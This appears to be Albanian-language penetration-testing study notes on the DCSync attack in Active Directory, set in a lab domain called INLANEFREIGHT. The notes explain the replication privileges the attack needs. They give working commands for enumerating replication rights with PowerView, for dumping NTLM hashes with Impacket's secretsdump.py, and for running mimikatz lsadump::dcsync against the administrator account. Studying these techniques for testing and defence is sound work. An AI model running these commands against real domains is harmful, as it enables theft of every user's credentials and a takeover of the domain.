
# DCSync

### 🔐 **Privilegjet që duhen për DCSync:**

- Të jesh anëtar i **`Domain Admins`** (ose)
- Të kesh **privilegjet e replikimit** në Active Directory, konkretisht:
    - `Replicating Directory Changes` (Get-Changes)
    - `Replicating Directory Changes All`

Këto privilegje i japin të drejtën të **"kopjosh" (replikosh) të dhënat e Active Directory**, përfshirë **hash-et e fjalëkalimeve** të përdoruesve.

### ⚙️ **Si funksionon sulmi DCSync?**

- Përdoruesi me privilegje i kërkon Domain Controller-it (DC) të japë kopje të të dhënave të replikimit të AD-së.
- Kjo i lejon sulmuesit të marrë **hash-et NTLM** (ose edhe fjalëkalimet në formë të enkriptuar/çelësave Kerberos) të përdoruesve në domen, pa pasur nevojë të hyjë direkt në server apo të komprometojë ndonjë shërbim.
- Është si të thuash: "Më jep më të dhënat që DC përdor për replikim me DC-të e tjerë."
- Kjo është e mundur vetëm nëse ke privilegjet e lartpërmendura.


### Enumeration / Discovery
```bash
# Kontrollo përdoruesin dhe grupet e tij në domen
Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol | fl

# Kontrollo privilegjet DCSync (Replication-Get-Changes) për përdoruesin (me SID)
$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | 
    ? { ($_.ObjectAceType -match 'Replication-Get')} | 
    ?{$_.SecurityIdentifier -match $sid} | 
    select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType | fl

# -----------------------------------
# Kontrollo përdoruesit e çaktivizuar në domen (Windows PowerShell)
# -----------------------------------

Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

# Kontrollo përdorues me opsionin ENCRYPTED_TEXT_PASSWORD_ALLOWED (Windows PowerShell)
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
```

### Linux - secretsdump.py
```bash
# ---------------------------------
# Linux - Impacket Tools (secretsdump.py)
# ---------------------------------

# DCSync nga linux
secretsdump.py 'username:password@domain'

# DCSync për përdoruesin syncron dhe ruaj hash-et në file
secretsdump.py INLANEFREIGHT/adunn@172.16.5.5 -just-dc-user syncron -outputfile inlanefreight_hashes

# Shiko hash-et e nxjerra (file .ntds përmban hash-et NTLM)
cat inlanefreight_hashes.ntds
```



### Windows - mimiktaz
```bash
# Hap PowerShell me kredencialet e përdoruesit "adunn" për rrjet (por jo lokalisht)
runas /netonly /user:INLANEFREIGHT\\adunn powershell

# Në PowerShell, starto mimikatz
.\\mimikatz.exe

# Në mimikatz, aktivizo privilegjin debug
privilege::debug

# Ekzekuto DCSync për përdoruesin administrator
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\\administrator
```